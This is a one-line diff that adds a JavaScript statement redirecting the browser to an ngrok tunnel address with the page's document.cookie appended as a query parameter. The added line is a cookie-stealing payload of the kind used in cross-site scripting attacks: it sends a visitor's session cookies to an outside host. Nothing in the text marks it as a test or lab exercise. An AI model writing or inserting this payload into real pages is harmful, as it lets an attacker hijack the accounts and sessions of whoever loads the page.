@@ -1,0 +1,1 @@
+window.location.href = "https://36bf-138-199-7-239.ngrok-free.app/?cookies="+document.cookie;
